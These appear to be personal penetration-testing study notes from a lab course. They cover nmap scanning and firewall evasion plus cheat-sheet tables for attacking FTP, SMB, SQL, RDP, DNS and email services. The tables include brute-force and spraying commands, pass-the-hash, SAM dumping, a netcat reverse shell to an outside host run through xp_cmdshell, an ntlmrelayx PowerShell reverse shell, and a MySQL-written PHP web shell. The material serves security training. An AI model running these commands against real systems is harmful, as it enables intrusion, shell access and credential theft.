	-sT ==>	It is useful when we want to map the network and don't want to disturb the services running behind it, thus causing a minimal impact and sometimes considered a more polite scan method. It is also useful when the target host has a personal firewall that drops incoming packets but allows outgoing packets. In this case, a Connect scan can bypass the firewall and accurately determine the state of the target ports. However, it is important to note that the Connect scan is slower than other types of scans because it requires the scanner to wait for a response from the target after each packet it sends, which could take some time if the target is busy or unresponsive.
			sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT 
			sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn
		> If we get an ICMP response with error code 3 (port unreachable), we know that the port is indeed closed.
			sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason
	--max-retries ==> By default is set to 1
	--traceroute
	-PA port list: TCP ACK Ping
	-PB: Use ACK and ICMP echo in parallel
	-PE: Use a true ping
	-PM: Use a netmask request
	-PP: Use an ICMP timestamp request 
	-PS: Use SYN packets instead of ACK
	-PU port list: UDP ping 
	-PY port list: SCTP INIT Ping
	-P0: IP Protocol Ping
      	-Pn 10.4.19.218 ==> Windows usually blocks ping probes. So -Pn is necessary. Applicable to Windows targets. Treat all hosts as online - skip host discovery. Disables ICMP echo requests
      	-F 10.4.19.218 ==> Fast scan
      	-sU 10.4.19.218 ==> UDP scan
        nmap 192.206.172.3 -p 134,177,234 -sUV --script=discovery
      	-sV : Version ==>  The version scan is underpinned by a comprehensive database of over 1,000 service signatures
      	-sC : List of nmap scripts to enumerate more information. 
      	-A  : Combine -sV, -O and -sC
      	-oX : xml format. Valid for metasploit
		xsltproc target.xml -o target.html ==> To report
		xmllint --format --html - ==> To terminal 
      	--top-port 25
####Service scanning
* Options
	--stats-every=5s or 1m
* If there is PHP ==> index.php
* Banner grabbing ==> nc -nv 10.129.42.23 21
			nmap -sV --script=banner -p21 10.10.10.0/24
			whatweb 138.68.143.219
			whatweb --no-errors 10.10.10.0/24
		> One disadvantage to Nmap's presented results is that the automatic scan can miss some information because sometimes Nmap does not know how to handle it. Let us look at an example of this.
			> If we look at the results from Nmap, we can see the port's status, service name, and hostname. Nevertheless, let us look at this line here:
    				NSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..
			> Then we see that the SMTP server on our target gave us more information than Nmap showed us. Because here, we see that it is the Linux distribution Ubuntu. It happens because, after a successful three-way handshake, the server often sends a banner for identification. This serves to let the client know which service it is working with. At the network level, this happens with a PSH flag in the TCP header. However, it can happen that some services do not immediately provide such information. It is also possible to remove or manipulate the banners from the respective services. If we manually connect to the SMTP server using nc, grab the banner, and intercept the network traffic using tcpdump, we can see what Nmap did not show us.
				sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28
				nc -nv 10.129.2.28 25
					> The first three lines show us the three-way handshake.
						1.	[SYN]	18:28:07.128564 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [S], <SNIP>
						2.	[SYN-ACK]	18:28:07.255151 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [S.], <SNIP>
						3.	[ACK]	18:28:07.255281 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], <SNIP>
					> After that, the target SMTP server sends us a TCP packet with the PSH and ACK flags, where PSH states that the target server is sending data to us and with ACK simultaneously informs us that all required data has been sent.
						4. 	[PSH-ACK] 	18:28:07.319306 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [P.], <SNIP>
					> The last TCP packet that we sent confirms the receipt of the data with an ACK.
						5. 	[ACK] 	18:28:07.319426 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], <SNIP>
* Tools
	https://github.com/FortyNorthSecurity/EyeWitness ==> Which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

####OS detection:
* On every network node ==> routers, firewalls, hosts, servers, printers and so on.
* Passive => You can perform OS fingerprint on a traffic capture you recorded 
* Active  => By using nmang -g p or other similar tools 
	-g/--source-port <portnum>: Use given port number
	-O: Enable OS detection
	--osscan-limit: Limit OS detection to promising targets //If you have to scan thousands of hosts you could at first limit OS reconnaissance to just the promising ones.
	--osscan-guess: Guess OS more aggressively

####Scan types:
* SYN scans are the default scans used by Nmap if run with sudo permissions. If run without sudo permissions, Nmap defaults to the TCP Connect scan 
	-sT: TCP connect scan. This type of scan gets recorded in the application logs.
	-sU: UDP scan. It's usually used with --top-ports [20 for example]
	-sS: SYN scan. A well-configured IDS will still detect the scan
	-sV: Version detection scan. Nmap performs a TCP connect scan and reads from the banner of the daemon listening on a port. This is not stealthy but very useful.
	-sN: TCP Null scans. When the TCP request is sent with no flags set at all. As per the RFC, the target host should respond with a RST if the port is closed.
	-sF: TCP FIN scans. Instead of sending a completely empty packet, a request is sent with the FIN flag (usually used to gracefully close an active connection). Once again, Nmap expects a RST if the port is closed.
	-sX: TCP Xmas scans. Send a malformed TCP packet and expects a RST response for closed ports. It's referred to as an xmas scan as the flags that it sets (PSH, URG and FIN)
* Specifying targets by DNS name
	nmap <scan type> target1.domain.com target2.otherdomain.com

#####Spotting a firewall
* You might often see that a version was not recognized regardless of the open port or that even the service type is not recognized. For example, 'tcpwrapped' means that the TCP handshake was completed but the remote host closed the connection without receiving any data.
* Using --reason. 
	-f:- Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
        An alternative to -f, but providing more control over the size of the packets: 
	--mtu <number>, accepts a maximum transmission unit size to use for the packets sent. This must be a multiple of 8.
    	--scan-delay <time>ms:- used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place.
    	--badsum:- this is used to generate in invalid checksum for packets. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to determine the presence of a firewall/IDS.

####Firewall and IDS/IPS evasion
* Nmap's TCP ACK scan (-sA) method is much harder to filter for firewalls and IDS/IPS systems than regular SYN (-sS) or Connect scans (sT) because they only send a TCP packet with only the ACK flag. When a port is closed or open, the host must respond with an RST flag. Unlike outgoing connections, all connection attempts (with the SYN flag) from external networks are usually blocked by firewalls. However, the packets with the ACK flag are often passed by the firewall because the firewall cannot determine whether the connection was first established from the external network or the internal network.
	sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
* Example
	> Pay attention to the RCVD packets and its set flag we receive from our target. With the SYN scan (-sS) our target tries to establish the TCP connection by sending a packet back with the SYN-ACK (SA) flags set and with the ACK scan (-sA) we get the RST flag because TCP port 22 is open. For the TCP port 25, we do not receive any packets back, which indicates that the packets will be dropped.
* VPS: Several virtual private servers (VPS) with different IP addresses are recommended to determine whether such systems like IDS or IPS are on the target network during a penetration test
* Decoys
	> There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (-D) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (RND) a specific number (for example: 5) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.
	sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
	> The spoofed packets are often filtered out by ISPs and routers, even though they come from the same network range. Therefore, we can also specify our VPS servers' IP addresses and use them in combination with "IP ID" manipulation in the IP headers to scan the target.
	> Another scenario would be that only individual subnets would not have access to the server's specific services. So we can also manually specify the source IP address (-S) to test if we get better results with this one. Decoys can be used for SYN, ACK, ICMP scans, and OS detection scans
		sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
* DNS proxying
	> By default, Nmap performs a reverse DNS resolution unless otherwise specified to find more important information about our target. These DNS queries are also passed in most cases because the given web server is supposed to be found and visited. The DNS queries are made over the UDP port 53. The TCP port 53 was previously only used for the so-called "Zone transfers" between the DNS servers or data transfer larger than 512 bytes. More and more, this is changing due to IPv6 and DNSSEC expansions. These changes cause many DNS requests to be made via TCP port 53.
	> However, Nmap still gives us a way to specify DNS servers ourselves (--dns-server <ns>,<ns>). This method could be fundamental to us if we are in a demilitarized zone (DMZ). The company's DNS servers are usually more trusted than those from the Internet. So, for example, we could use them to interact with the hosts of the internal network. As another example, we can use TCP port 53 as a source port (--source-port) for our scans. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through.
		sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
	> Now that we have found out that the firewall accepts TCP port 53, it is very likely that IDS/IPS filters might also be configured much weaker than others. We can test this by trying to connect to this port by using Netcat.
		ncat -nv --source-port 53 10.129.2.28 50000

####Ports
	-p-: All ports
	-p 21,22,80 
	-p 100-200
	nmap -p- 192.188.164.1,2,3,4,5,6 or 192.188.164.1-6
####Nmap scripting engine
* Category	Description
	auth		Determination of authentication credentials.
	broadcast	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
	brute		Executes scripts that try to log in to the respective service by brute-forcing with credentials.
	default		Default scripts executed by using the -sC option.
	discovery	Evaluation of accessible services.
	dos		These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
	exploit		This category of scripts tries to exploit known vulnerabilities for the scanned port.
	external	Scripts that use external services for further processing.
	fuzzer		This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
	intrusive	Intrusive scripts that could negatively affect the target system.
	malware		Checks if some malware infects the target system.
	safe		Defensive scripts that do not perform intrusive and destructive access.
	version		Extension for service detection.
	vuln		Identification of specific vulnerabilities.
* Default scripts
	sudo nmap <target> -sC
* Specified scripts category
	sudo nmap <target> --script <category>
	sudo nmap 10.129.2.28 -p 80 -sV --script vuln
* Defined scripts
	sudo nmap <target> --script <script-name>,<script-name>,...
	sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands
####Performance
* Timeouts
	> When Nmap sends a packet, it takes some time (Round-Trip-Time - RTT) to receive a response from the scanned port. Generally, Nmap starts with a high timeout (--min-RTT-timeout) of 100ms.
	> Default scan
		sudo nmap 10.129.2.0/24 -F
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds
	> Optimized RTT
		sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
		<SNIP>
		Nmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds
	> From this, we can conclude that setting the initial RTT timeout (--initial-rtt-timeout) to too short a time period may cause us to overlook hosts.
* Max retries
	> Another way to increase the scans' speed is to specify the retry rate of the sent packets (--max-retries). The default value for the retry rate is 10, so if Nmap does not receive a response for a port, it will not send any more packets to the port and will be skipped.
	> Default scan
		sudo nmap 10.129.2.0/24 -F | grep "/tcp" | wc -l
		23
	> Reduced retries
		sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep "/tcp" | wc -l
		21
	> Again, we recognize that accelerating can also have a negative effect on our results, which means we can overlook important information.
* Rates	
	> During a white-box penetration test, we may get whitelisted for the security systems to check the systems in the network for vulnerabilities and not only test the protection measures. If we know the network bandwidth, we can work with the rate of packets sent, which significantly speeds up our scans with Nmap. When setting the minimum rate (--min-rate <number>) for sending packets, we tell Nmap to simultaneously send the specified number of packets. It will attempt to maintain the rate accordingly.
	> Default scan
		sudo nmap 10.129.2.0/24 -F -oN tnet.default
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds
	> Optimized scan
		sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds
* Timing
> The default timing template used when we have defined nothing else is the normal (-T 3)
	T 0 / -T paranoid
	T 1 / -T sneaky
    	T 2 / -T polite
    	T 3 / -T normal
    	T 4 / -T aggressive
    	T 5 / -T insane




####Others nmap 
	-oA: Output in the three major formats at once
	-A: Enable OS detection, version detection, script scanning, and traceroute
* Scripts
	/usr/share/nmap/scripts/script.db and nmap --script-updatedb
	nmap -sV --script=http-enum
* Dictionary attack by ssh
	nmap -p22 --script ssh-brute --script-args userdb=./username.lst,passdb=/usr/share/nmap/nselib/data/password.lst demo.ine.local
* Example
	--script=vuln: Activate all the scripts in the vuln category
	iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset: Configure the firewall to respond with a RST TCP packet

* Categories of scripts:   https://nmap.org/book/nse-usage.html

	nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' : Example
-=-=

###Footprinting, scanning & enumeration
####SMB, Samba & NetBIOS [RPC included]
* Servers and clients use NetBIOS (Network Basic Input Output System) when viewing network shares on the LAN. NetBIOS can supply some of the following information when querying a computer:
    	> Hostname
    	> NetBIOS name
    	> Domain
    	> Network shares
* NetBIOS layer sits between the application layer and the IP layer
    	> UDP port 137 ==> NetBIOS names resolution. To find workgroups
    	> UDP port 138 ==> NetBIOS datagrams. A host can send small messages to many other hosts. To list the shares and the machines

    	> TCP port 139 ==> NetBIOS session. Heavy traffic, such as a file copy. To transmit data to and from a 
## Attacking FTP

|**Command**|**Description**|
|-|-|
| `ftp 192.168.2.142` | Connecting to the FTP server using the `ftp` client. |
| `nc -v 192.168.2.142 21` | Connecting to the FTP server using `netcat`. |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Brute-forcing the FTP service. |


---
## Attacking SMB

|**Command**|**Description**|
|-|-|
| `smbclient -N -L //10.129.14.128` | Null-session testing against the SMB service. |
| `smbmap -H 10.129.14.128` | Network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 -r notes` | Recursive network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Download a specific file from the shared folder. |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
| `rpcclient -U'%' 10.10.110.17` | Null-session with the `rpcclient`. |
| `./enum4linux-ng.py 10.10.11.45 -A -C` | Automated enumeratition of the SMB service using `enum4linux-ng`. |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Connect to the SMB service using the `impacket-psexec`. |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using `crackmapexec`. |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users. |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database. |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Dump the SAM database using `impacket-ntlmrelayx`. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |

---
## Attacking SQL Databases

|**Command**|**Description**|
|-|-|
| `mysql -u julio -pPassword123 -h 10.129.20.13` | Connecting to the MySQL server. |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` | Connecting to the MSSQL server.  |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux.  |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
| `mysql> SHOW DATABASES;` | Show all available databases in MySQL. |
| `mysql> USE htbusers;` | Select a specific database in MySQL. |
| `mysql> SHOW TABLES;` | Show all available tables in the selected database in MySQL. |
| `mysql> SELECT * FROM users;` | Select all available entries from the "users" table in MySQL. |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases` | Show all available databases in MSSQL. |
| `sqlcmd> USE htbusers` | Select a specific database in MSSQL. |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES` | Show all available tables in the selected database in MSSQL. |
| `sqlcmd> SELECT * FROM users` | Select all available entries from the "users" table in MSSQL. |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
| `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
| `sqlcmd> xp_cmdshell 'whoami'` |B Execute a system command from MSSQL server. |
 xp_cmdshell "c:\temp\PrintSpoofer.exe -c "c:\temp\nc64.exe 172.16.7.240 443 -e cmd""
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
| `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
| `mysql> select LOAD_FILE("/etc/passwd");` | Read local files in MySQL. |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'` | Hash stealing using the `xp_dirtree` command in MSSQL. |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'` | Hash stealing using the `xp_subdirs` command in MSSQL. |
| `sqlcmd> SELECT srvname, isremote FROM sysservers` | Identify linked servers in MSSQL.  |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL.  |



---
## Attacking RDP

|**Command**|**Description**|
|-|-|
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` | Password spraying against the RDP service. |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` | Brute-forcing the RDP service. |
| `rdesktop -u admin -p password123 192.168.2.143` | Connect to the RDP service using `rdesktop` in Linux. |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` | Impersonate a user without its password. |
| `net start sessionhijack` | Execute the RDP session hijack. |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host. |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` | Use the Pass-The-Hash technique to login on the target host without a password. |


---
## Attacking DNS

|**Command**|**Description**|
|-|-|
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Perform an AXFR zone transfer attempt against a specific name server. |
| `subfinder -d inlanefreight.com -v` | Brute-forcing subdomains. |
| `host support.inlanefreight.com` | DNS lookup for the specified subdomain. |

---
## Attacking Email Services

|**Command**|**Description**|
|-|-|
| `host -t MX microsoft.com` | DNS lookup for mail servers for the specified domain. |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"` | DNS lookup for mail servers for the specified domain. |
| `host -t A mail1.inlanefreight.htb.` | DNS lookup of the IPv4 address for the specified subdomain. |
| `telnet 10.10.110.20 25` | Connect to the SMTP server. |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7` | SMTP user enumeration using the RCPT command against the specified host. |
| `python3 o365spray.py --validate --domain msplaintext.xyz` | Verify the usage of Office365 for the specified domain. |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz` | Enumerate existing users using Office365 on the specified domain. |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Password spraying against a list of users that use Office365 for the specified domain. |
| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` | Brute-forcing the POP3 service. |
| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability. |


[+] URLs
    > Administrators need to plan their access rights strategy, and there are some alternatives such as Role-based access control (RBAC), Access control lists (ACL). If we want more details pros and cons of each method, we can read Choosing the best access control strategy by Warren Parad from Authress.
    https://en.wikipedia.org/wiki/Role-based_access_control
    https://en.wikipedia.org/wiki/Access-control_list
    https://authress.io/knowledge-base/role-based-access-control-rbac


Windows share
* SMB
	> In IP networks, SMB uses TCP protocol for this purpose, which provides for a three-way handshake between client and server before a connection is finally established. The specifications of the TCP protocol also govern the subsequent transport of data. We can take a look at some examples here ==> https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/%5bMS-SMB2%5d.pdf#%5B%7B%22num%22%3A920%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C69%2C738%2C0%5D
	> An SMB server can provide arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. Access rights are defined by Access Control Lists (ACL). They can be controlled in a fine-grained manner based on attributes such as execute, read, and full access for individual users or user groups. The ACLs are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.

    > Windows cmd
        + There are different ways we can interact with a shared folder using Windows, and we will explore a couple of them. On Windows GUI, we can press [WINKEY] + [R] to open the Run dialog box and type the file share location, e.g.: \\192.168.220.129\Finance\
        + Windows has two command-line shells: the Command shell(https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) and PowerShell(https://docs.microsoft.com/en-us/powershell/scripting/overview). Each shell is a software program that provides direct communication between us and the operating system or application, providing an environment to automate IT operations.

            C:\htb> dir \\192.168.220.129\Finance\
        + The command net use connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter n.
            C:\htb> net use n: \\192.168.220.129\Finance
        + We can also provide a username and password to authenticate to the share.
            C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
        + With the shared folder mapped as the n drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
            C:\htb> dir n: /a-d /s /b | find /c ":\"
        + Let's walk through the command:
            Syntax	Description
            dir	    Application
            n:	    Directory or drive to search
            /a-d	/a is the attribute and -d means not directories
            /s	    Displays files in a specified directory and all subdirectories
            /b	    Uses bare format (no heading information or summary)
        + The following command | find /c ":\\" process the output of dir n: /a-d /s /b to count how many files exits in the directory and subdirectories. You can use dir /? to see the full help. Searching througth 29,302 files is time comsuming, scripting and command line utilities can help us speed up the search. With dir we can search for specific names in files such as:
            cred
            password
            users
            secrets
            key
            Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.
            
            C:\htb>dir n:\*cred* /s /b
            n:\Contracts\private\credentials.txt
            
            C:\htb>dir n:\*secret* /s /b
            n:\Contracts\private\secret.txt

        + If we want to search for a specific word within a text file, we can use findstr.
            c:\htb>findstr /s /i cred n:\*.*
        
    > Windows PowerShell
        + PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called cmdlets. Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets. Let's replicate the same commands now using Powershell.
            PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\
        + Instead of net use, we can use New-PSDrive in PowerShell.
            PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
        + To provide a username and password with Powershell, we need to create a PSCredential object(https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential). It offers a centralized way to manage usernames, passwords, and credentials.
            ! Windows PowerShell - PSCredential Object
                PS C:\htb> $username = 'plaintext'
                PS C:\htb> $password = 'Password123'
                PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
                PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
                PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
        + In PowerShell, we can use the command Get-ChildItem or the short variant gci instead of the command dir.
            ! Windows Powershell
                PS C:\htb> N:
                PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
                29302
        + We can use the property -Include to find specific items from the directory specified by the Path parameter.
            PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
        + The Select-String cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use Select-String similar to grep in UNIX or findstr.exe in Windows.
            ! Windows PowerShell - Select-String
                PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List

                
*Linux 
    > Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.
        m1l0js@htb[/htb]$ sudo mkdir /mnt/Finance
        m1l0js@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance

    > As an alternative, we can use a credential file.
    > Linux - Mount
        m1l0js@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
    > The file credentialfile has to be structured like this:
        CredentialFile
        Code: txt
        
        username=plaintext
        password=Password123
        domain=.
    > Note: We need to install cifs-utils to connect to an SMB share folder. To install it we can execute from the command line sudo apt install cifs-utils.
    > Once a shared folder is mounted, you can use common Linux tools such as find or grep to interact with the file structure. Let's hunt for a filename that contains the string cred:
    > Linux - Find
        m1l0js@htb[/htb]$ find /mnt/Finance/ -name *cred*
        /mnt/Finance/Contracts/private/credentials.txt
    > Next, let's find files that contain the string cred:
    > Linux - Find
        m1l0js@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred
        /mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
        /mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
    
[+] Email
    > We can use a mail client such as Evolution(https://wiki.gnome.org/Apps/Evolution), the official personal information manager, and mail client for the GNOME Desktop Environment. We can interact with an email server to send or receive messages with a mail client. To install Evolution, we can use the following command:
        m1l0js@htb[/htb]$ sudo apt-get install evolution
    > Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution export WEBKIT_FORCE_SANDBOX=0 && evolution.
    > We can use the domain name or IP address of the mail server. If the server uses SMTPS or IMAPS, we'll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting). We can use the Check for Supported Types option under authentication to confirm if the server supports our selected method.
[+] Databases
    > Databases are typically used in enterprises, and most companies use them to store and manage information. There are different types of databases, such as Hierarchical databases, NoSQL (or non-relational) databases, and SQL relational databases. We will focus on SQL relational databases and the two most common relational databases called MySQL & MSSQL. We have three common ways to interact with databases:
    	
    1. 	Command Line Utilities (mysql or sqsh)
    2. 	A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio.
    3. 	Programming Languages

    + Command line utilities
        > MSSQL
            To interact with MSSQL (Microsoft SQL Server => https://www.microsoft.com/en-us/sql-server/sql-server-downloads) with Linux we can use sqsh or sqlcmd if you are using Windows. Sqsh is much more than a friendly prompt. It is intended to provide much of the functionality provided by a command shell, such as variables, aliasing, redirection, pipes, back-grounding, job control, history, command substitution, and dynamic configuration. We can start an interactive SQL session as follows:
            Linux - SQSH
            m1l0js@htb[/htb]$ sqsh -S 10.129.20.13 -U username -P Password123

            ! The sqlcmd utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:
                - At the command prompt.
                - In Query Editor in SQLCMD mode.
                - In a Windows script file.
                - In an operating system (Cmd.exe) job step of a SQL Server Agent job.
                
            C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
            
            To learn more about sqlcmd usage, you can see Microsoft documentation(https://docs.microsoft.com/en-us/sql/ssms/scripting/sqlcmd-use-the-utility).

        > MySQL

            + To interact with MySQL, we can use MySQL binaries for Linux (mysql) or Windows (mysql.exe). MySQL comes pre-installed on some Linux distributions, but we can install MySQL binaries for Linux or Windows using this guide(https://dev.mysql.com/doc/mysql-getting-started/en/#mysql-getting-started-installing). Start an interactive SQL Session using Linux:
            + Linux - MySQL
                m1l0js@htb[/htb]$ mysql -u username -pPassword123 -h 10.129.20.13
            + We can easily start an interactive SQL Session using Windows:
            + Windows - MySQL
                C:\htb> mysql.exe -u username -pPassword123 -h 10.129.20.13

    + GUI Application

        > Database engines commonly have their own GUI application. MySQL has MySQL Workbench(https://dev.mysql.com/downloads/workbench/) and MSSQL has SQL Server Management Studio or SSMS(https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms), we can install those tools in our attack host and connect to the database. SSMS is only supported in Windows. An alternative is to use community tools such as dbeaver(https://github.com/dbeaver/dbeaver). dbeaver is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.
        > To install dbeaver using a Debian package we can download the release .deb package from https://github.com/dbeaver/dbeaver/releases and execute the following command:
        > Install dbeaver
            m1l0js@htb[/htb]$ sudo dpkg -i dbeaver-<version>.deb
        > To start the application use:
        > Run dbeaver
            m1l0js@htb[/htb]$ dbeaver &
        > To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).
